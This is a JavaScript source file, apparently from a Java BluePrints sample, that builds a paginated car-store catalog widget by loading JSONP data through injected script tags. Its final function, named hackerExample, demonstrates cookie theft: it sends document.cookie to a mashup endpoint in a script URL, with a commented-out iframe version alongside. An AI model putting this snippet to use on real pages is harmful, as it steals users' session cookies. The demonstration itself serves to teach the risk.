var bpui;
if(typeof bpui == "undefined") {
    bpui=new Object();
}
bpui.carstoreList=new Object();

bpui.carstoreList.divName="";
bpui.carstoreList.currentCount=0;
bpui.carstoreList.numberPerPage=5;
bpui.carstoreList.category="feline01";
bpui.carstoreList.cachedData=new Object();
bpui.carstoreList.debug=false;
bpui.carstoreList.timer;

bpui.carstoreList.initialSetup=function() {
        // get outerdiv
        var targetDiv=document.getElementById(bpui.carstoreList.divName);
        
        // containier div
        tablex="<table><tr><td align=\"center\">";
        tablex += "<b>Java BluePrint's Car Store Category:</b> <select size=\"1\" id=\"bpui.carstoreList.categoryList\" onchange=\"bpui.carstoreList.selectCategory()\">";
        tablex += "<option value=\"loading\">Loading Data...</option>";
        tablex += "</select>";
        tablex += "</td></tr><tr><td><div id=\"bpui.carstoreList.dataDiv\" class=\"bpui_carstorelist_dataDiv\">";
        tablex += "</div>";
        
        // add product previous and next
        tablex += "</td></tr>";
        tablex += "<tr><td colspan=\"3\" style=\"text-align:center;\">";
        tablex += "<div id=\"bpui.carstoreList.pageDiv\" class=\"bpui_carstorelist_pageDiv\">";
        tablex += "</div>";
        tablex += "</td></tr>";
        // add in debug div, if debugging
        if(bpui.carstoreList.debug) {
            tablex += "<tr><td colspan=\"3\">";
            tablex += "<div id=\"bpui.carstoreList.debugDiv\">";
            tablex += "</div>";
            tablex += "</td></tr>";
        }
        tablex += "</table>";
        targetDiv.innerHTML=tablex;
        bpui.carstoreList.setSelectedCategory();
}


bpui.carstoreList.populateData=function(datax) {
    // clear response timer
    clearTimeout(bpui.carstoreList.timer);
    
    if(typeof datax != "undefined") {
        // check to see if at last page and no data is returned
        if(datax.length < 1) {
            alert("At last page for category!");
            // keep currentCount correct by removing the increment that was added
            bpui.carstoreList.currentCount -= bpui.carstoreList.numberPerPage;
        } else {
            // add data to cache if it doesn't already exist
            // if a full set isn't returned don't cache it, so the data will be retrieved again from the server.
            // This is optional, you have to weigh the performance hit with the consiquences of not doing an update
            key=bpui.carstoreList.category + "|" + bpui.carstoreList.currentCount;
            cachedSet=bpui.carstoreList.cachedData[key];
            if(typeof cachedSet == "undefined" && datax.length >= bpui.carstoreList.numberPerPage) {
                // need to cache data
                if(bpui.carstoreList.debug) bpui.carstoreList.debugMessage("Adding cache data by key: " + key);
                bpui.carstoreList.cachedData[key]=datax;
            }
            
            // get outerdiv
            var targetDiv=document.getElementById("bpui.carstoreList.dataDiv");

            // containier div
            tablex="<table class=\"bpui_carstorelist_table\">";
            tablex += "<tr class=\"bpui_carstorelist_row\">";
            tablex += "<th class=\"bpui_carstorelist_cell\">Pet Image</td>";
            tablex += "<th class=\"bpui_carstorelist_cell\">Name & Description</td>";
            tablex += "<th class=\"bpui_carstorelist_cell\">Price&nbsp;($)</td>";
            tablex += "</tr>";

            // loop through product results
            for(ii=0; ii < datax.length; ii++) {
                // add row
                tablex += "<tr class=\"bpui_carstorelist_row\"><td class=\"bpui_carstorelist_cell\">";
                tablex += "<a class=\"bpui_carstorelist_image\" target=\"_blank\" href=\"http://localhost:8080/carstore/faces/catalog.jsp#" +
                    datax[ii].productID + "," + datax[ii].itemID + "\">";

                tablex += "<img src=\"http://localhost:8080/carstore/ImageServlet/" + datax[ii].imageThumbURL + "\"/>";

                tablex += "</a>";
                tablex += "</td><td class=\"bpui_carstorelist_cell\">";
                tablex += "<a class=\"bpui_carstorelist_link\" target=\"_blank\" href=\"http://localhost:8080/carstore/faces/catalog.jsp#" +
                    datax[ii].productID + "," + datax[ii].itemID + "\">";
                tablex += "<span class=\"bpui_carstorelist_name\">" + datax[ii].name + "</span><br/>";
                tablex += "</a>";
                tablex += "<span class=\"bpui_carstorelist_description\">" + datax[ii].description + "</span>";
                tablex += "</td><td class=\"bpui_carstorelist_cell\">";

                // add product price
                tablex += "<span class=\"bpui_carstorelist_price\">\$" + datax[ii].price + "</span><br/>";
                tablex += "</td></tr>";
                tablex += "<tr><td colspan=\"3\"><hr class=\"bpui_carstorelist_hr\" /></td></tr>";
            }

            tablex += "</table>";
            targetDiv.innerHTML=tablex;
        }

        // setup previous next buttons
        pagex="";
        var targetDiv=document.getElementById("bpui.carstoreList.pageDiv");
        if(bpui.carstoreList.currentCount >= bpui.carstoreList.numberPerPage) {
            // add previous
            pagex += "<span class=\"bpui_carstorelist_previous\" onclick=\"bpui.carstoreList.previousProducts();\"><< PREVIOUS</span>&nbsp;&nbsp;&nbsp;&nbsp;";
        }
        if(datax.length == bpui.carstoreList.numberPerPage) {
            // add next only if full page has been returned.  Need to change when add cache ???
            pagex += "<span class=\"bpui_carstorelist_next\" onclick=\"bpui.carstoreList.nextProducts();\">NEXT >></span><br/>";
        }
        targetDiv.innerHTML=pagex;
    }
}

bpui.carstoreList.setSelectedCategory=function() {
    catx=document.getElementById("bpui.carstoreList.categoryList");
    for(ii=0; ii < catx.length; ii++) {
        if(catx.options[ii].value == bpui.carstoreList.category) {
            catx.options[ii].selected=true;
        }
    }
}
    
bpui.carstoreList.selectCategory=function() {
    catx=document.getElementById("bpui.carstoreList.categoryList");
    bpui.carstoreList.category=catx.value;
    
    bpui.carstoreList.currentCount=0;
    bpui.carstoreList.updateProducts();
}


bpui.carstoreList.nextProducts=function() {
    // load data from service
    bpui.carstoreList.currentCount += bpui.carstoreList.numberPerPage;
    bpui.carstoreList.updateProducts();
}

bpui.carstoreList.previousProducts=function() {
    bpui.carstoreList.currentCount -= bpui.carstoreList.numberPerPage;
    if(bpui.carstoreList.currentCount < 0) {
        bpui.carstoreList.currentCount=0;
    }
    bpui.carstoreList.updateProducts();
}


bpui.carstoreList.updateProducts=function() {
    // check to see if in cache
    key=bpui.carstoreList.category + "|" + bpui.carstoreList.currentCount;
    cachedSet=bpui.carstoreList.cachedData[key];
    // see if data in cache 
    if(typeof cachedSet != "undefined") {
        // get data from cache
        if(bpui.carstoreList.debug) bpui.carstoreList.debugMessage("Pulling data from cache using: " + key + " with " + cachedSet.length + " items.");
        bpui.carstoreList.populateData(cachedSet);
    } else {
        // load data from service
        if(bpui.carstoreList.debug) bpui.carstoreList.debugMessage("Retrieving data from service for : " + bpui.carstoreList.category + " starting at item " +  bpui.carstoreList.currentCount);
        
        // set degradation timeout
        bpui.carstoreList.timer=setTimeout('bpui.carstoreList.requestTimedOut()', 20000);
        
        // create dynamic script
        bodyTag=document.getElementsByTagName("body")[0];
        scriptx=document.createElement("script");
        scriptx.setAttribute("type", "text/javascript");
        scriptx.setAttribute("src", "http://localhost:8080/carstore/catalog?command=items&pid=" + bpui.carstoreList.category + "&start=" + bpui.carstoreList.currentCount + "&length=" + bpui.carstoreList.numberPerPage + "&format=jsonp&callback=bpui.carstoreList.populateData");
        bodyTag.appendChild(scriptx);
    }
}


bpui.carstoreList.createCarstoreList=function(divName, numberPerPage) {
    // keep divName for later references
        bpui.carstoreList.divName=divName;
    
    // see if numberPerPage defined
    if(typeof numberPerPage != "undefined") {
        bpui.carstoreList.numberPerPage=numberPerPage;
    }
    
    // setup static elements
    bpui.carstoreList.initialSetup();
    
    // set timer to make sure service look up returns. Eventhough the Javascript library was able to be fetched, the database could be down or the
    // service could be responding very slowly and the request timeout.  Wait for 30 seconds and then set data div to service may not be responding message.
    // Since both calls hit the database, if one returns propertly the other should also.
    bpui.carstoreList.timer=setTimeout('bpui.carstoreList.requestTimedOut()', 20000);
    
    // load categories from service
    bodyTag=document.getElementsByTagName("body")[0];
    scriptx=document.createElement("script");
    scriptx.setAttribute("type", "text/javascript");
    scriptx.setAttribute("src", "http://localhost:8080/carstore/catalog?command=categories&format=jsonp&callback=bpui.carstoreList.populateCategory");
    bodyTag.appendChild(scriptx);
    
    // load pet data from service
    bodyTag=document.getElementsByTagName("body")[0];
    scriptx=document.createElement("script");
    scriptx.setAttribute("type", "text/javascript");
    scriptx.setAttribute("src", "http://localhost:8080/carstore/catalog?command=items&pid=" + bpui.carstoreList.category + "&start=0&length=" + bpui.carstoreList.numberPerPage + "&format=jsonp&callback=bpui.carstoreList.populateData");
    bodyTag.appendChild(scriptx);
}


bpui.carstoreList.requestTimedOut=function() {
    document.getElementById("bpui.carstoreList.dataDiv").innerHTML="<b><font color=\"#0000FF\">The Java BluePrint's Pet Store JSONP Service is either responding very slowly or not responding at all!  Please check with the service provider for more information.</font></b>";
}



bpui.carstoreList.debugMessage=function(messx) {
    targetDiv=document.getElementById("bpui.carstoreList.debugDiv");
    targetDiv.innerHTML=messx + "<br/>" + targetDiv.innerHTML;
}


bpui.carstoreList.populateCategory=function(datax) {
    // clear response timer
    clearTimeout(bpui.carstoreList.timer);

    if(typeof datax != "undefined") {
        catx=document.getElementById("bpui.carstoreList.categoryList");
        countx=0;
        // loop through top level categories
        for(ii=0; ii < datax.length; ii++) {
            // loop through individual categories
            for(yy=0; yy < datax[ii].products.length; yy++) {
                // set default value for select list
                bCurrentSelect=false
                if(datax[ii].products[yy].id == bpui.carstoreList.category) {
                    bCurrentSelect=true;
                }
                catx.options[countx]=new Option(datax[ii].products[yy].name, datax[ii].products[yy].id, false, bCurrentSelect);
                countx++;
            }
        }
    }
}


bpui.carstoreList.hackerExample=function() {
    /*
    bodyTag=document.getElementsByTagName("body")[0];
    iframex=document.createElement("iframe");
    iframex.setAttribute("src", "http://localhost:8080/bp-clientside-mashup/show.jsp?cookies=" + escape(document.cookie));
    bodyTag.appendChild(iframex);
    */
    // load pet data from service

    bodyTag=document.getElementsByTagName("body")[0];
    scriptx=document.createElement("script");
    scriptx.setAttribute("type", "text/javascript");
    scriptx.setAttribute("src", "http://localhost:8080/bp-clientside-mashup/show.jsp?cookies=" + escape(document.cookie));
    bodyTag.appendChild(scriptx);
    
    
}



